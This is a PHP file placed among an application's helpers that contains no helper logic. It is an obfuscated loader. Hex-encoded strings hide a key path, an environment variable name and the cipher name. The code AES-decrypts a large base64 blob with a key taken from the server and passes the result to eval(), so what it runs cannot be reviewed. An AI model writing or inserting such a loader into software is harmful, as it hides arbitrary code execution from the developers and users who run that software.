<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('BLVsCm/hYzHM76zvaFWB/w==');

$c=base64_decode(

'fTo7i6JsMVfhVIDn1zYMm25KWPJIzEE5pK/FjMNWPtKpI0RN6m9RH1iheypi3s+R7MH15ftqVd7R' .
'ylOuJilgPdrU/xIHk5zbuHk/y9VFDS3A0w7XCGDSl5A48Ow12AUkkQFZ87ZZ+i+QguWjmMFxHCZE' .
'L8MzXiKv9C/uy9/Gw9Tl92AWxLg7TKmsBs5UKTCjtV+5fFifBcNRjSzpGx87XW84RyzjbWCO1hYZ' .
'sFcfi0v7d1Ooq4HrbbZVvYaeuRZ9ikH0EfbYSItVd9Qg1bUDqHQSoriAFSmmleaqBhxpj0vhTtWk' .
'IX8LPPKUVyBmjDu9npNFKaDFRQzyKW3AexWb/4vQSEedwk+ZXfh5mhS3Zw4hLf3OpAUmBH8e8vet' .
'1eal90iVHaKMJefWhvTexeJgtcEsheDvEvNesbUTpU+XRsizvPICUIAo9jz7iXFpEuKRdyLLJ7g8' .
'0Ktp/xF6FvT+L7OHdaGElTBx2GHlRMYxD8CLDier+qw9yNP9nawIAK/IaQjBFdVbJ3VJ4NcE6mQA' .
'EnRXbWShXutDjmWFnKusApg+gTKBbpiQ5uyn9je6QXBAJqnkpr8FX0N7jXAszoRpwTIkKgarhBQB' .
'iSsBPNMz2iGwAzm63Ny0U3wfMayYSiPbPa6lJ8BUE20QPIrz+GYVa1HX55rCZGMzsnlto/Z//Pv/' .
'n1y66LkC+W2SzLMVRZr2IZocWtEU7T2erkbMmhTEplZyIXoHidzO4dGifFgAvY7zMysaZLM5zwDJ' .
's42MJifTiYBW229YWjPNMmAtcp6T3dz0q8ABERNtuewuDa3USVt3zxuQ6zcGnKVHJ0+WMq58iKSh' .
'82QFjxUyNfDEr6WriztWxycESMJUbjg09qqol+zEgNj+UczlY3httW32UDZ8xW7iD1Hq68J866kF' .
'M5o1SLHPIyUKl495bZeeeUrf5ANF2WI+dbenHt02FRSWpkx1G3Hov2MyahcAdvy0JRwxVRLCjeCf' .
'KbpwsBq+A4Q6yVWiYuSlZ+N2lgpLyjYDvfmnWxXbAsOPXebrR0nt6oit1Snv6JNwSSJhMQGVBofu' .
'OiqDAgYzkTV6IfxjkukMp8lTIutg7WWZ3GglZOIHMZcstSbMRgeIPePLR6LaKmjDdyQb5/WsEcVj' .
'QtZnhaxErZiwY4L47XvWS5IDvydXLQYWzrs0dcrRU5BUfRvjig6mYBOlacCztEkEn/9puq3Dc4Dq' .
'wFc+DODM9xD1e0XKqP+Ao3rQfAjn8lfcXxeUeB6Vzns8CmZaFUcf2NfocVb8LGD07mUwXm9MuIq+' .
'+7HUQaH7U/3s+/gNGBmfg++2Dfxo/K9zXEp6KLq2uKWuOOJCRDcyQd2UuXQH+JWixBzIsNztTG7F' .
'Ga3iEDl2LQsFWKd12VbBCBSbNRfxCutH+rnT7OTYhMRQ5zh8rzDUxy0fTS2cja6LiOQdZcZnsICJ' .
'a2RK7Bhs3/V7XHqx1Ta6N/9TWo16zWEFr4gYLRl77YRh0DLjm+lznlJcXSwuf7Zmzc72fFFG3BBt' .
'lia9CJ06SrOvmynizDfo9lBeBLsHiF1Q8dXswlaiHKkB9wTpbqyiPUBTxpi8fZ6BKjB3SLF5SylS' .
'WEsibAEGvPppVPve+IazU8uNJtBiFdREfbTHFlR48kElNrXZBQeXaONz+y3u2z5x9CuI8+QTv2Gb' .
'ETCJGHnyUP+oTxPM1RhQmm5GSKNtf5IC8zJ3eKf+rqaZBsrLPaXI2MKtaZtbu2ijoNiikW/NvL44' .
'uUz6HuKDd0j9NMOrLirUIMqeYEubn8pgCK3bb2wUWlFh3FqKmyZmRk1RDjKfQIwlbT3X2/uScc8M' .
'IzVwA7QxJfROqIdiyY6sNHWiuhX9dbu6E/GizNsPFn1h3Z+vVhsqTihFX5nhMen/TA7Xguxu9T1H' .
'jlXxxYhX3vQ8RUoI4eqtj8XNv0vTaCBZyv342S4t5hH10HfDvX5+tsFAu2Hndizlrt6rHZumZGiJ' .
'h4QhWsN7RRMHZ405jyQMSXxoHLPWJ5IsDGGZeMqAgIdrr7GAbiKCaSvpEhxdzTqogj3pgmr90Ptf' .
'qkrzSfp0+m3x6V1+bs7APtxHmx9c8d6b3csrEvdValjyuheaeSlRjelTG7VRJfstuDvBjP2isiyh' .
'f8QuqL5Hlx7yy5zuehcGFP1Aox6sBKaT613E2Zm+kXw1Xo06sJeUfAEM0PwkuUXM63divQRplbt+' .
'CgTKvATjhIZVzmcyP8OgwBgnbTAFbTawONqkLa4aosGMAarMo11xvaF5NKE4s39neiFmByfqGnew' .
'32mlX0Hn5CKVlX3BlU/EsgZnHZNlXgOhaUweCruByaAasZ+7SZMKf4eDS5N3nCiK+pUg5JB4bvF4' .
'+7b7RDeyVS3r1HG5F/fZjO8/+dQBuKRcLhjvUUU0rfAQjJv3BWCAkkSMe+nHMFhVIg9sRiHvcWic' .
'SDtApGOeZSOAJHvk8elapoXjEPHdBE8wOodKVA7aEaECNoiaKQ2jCZOXu+7ZQWTc0mwnXfb09OKm' .
'Qu+V0HcDjIICPrZYFC70Ggip6eZo0oXcMkf7HpxDo2v4WI99K1+oLTIw1bkEKQ3X0yE1enjp+7Ey' .
'GXr5Hcm7podsTuq/N8YUtnf+E4gWDTB1eaYWc6qNmLaS/hKy8gbpcmEjQkrSKMoyomT2+XOoVL++' .
'YQj02p4/Xo6czVXXGkHPkTwrIDD5isUHgr5ghTM+1CFdj0Re48MdZ48QIn6Ho0njB4wdxRWo4ke5' .
'dBinbnHM42mtd1TGYLiEOBPyAEZzqwGBQSynH0l96iRRd/QZeT5DBigFnXsjQBVbEHtBsBqujHLx' .
'TUEWDEBjy0RoH7haCCeo+Iij+qieIglR/b8F5jBWgZ96sLSGpM/+RoaN+U7ED5aSh65G5qL97luj' .
'JV0/iiqoYKhE2ZIK7HikiQylb7J8T/aoNZfmVuAETRauowVhmjIxmcLMB98eXGplZrPmAtN8E9LI' .
'qAx/Z2a05HfoQUickfPz3fE='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

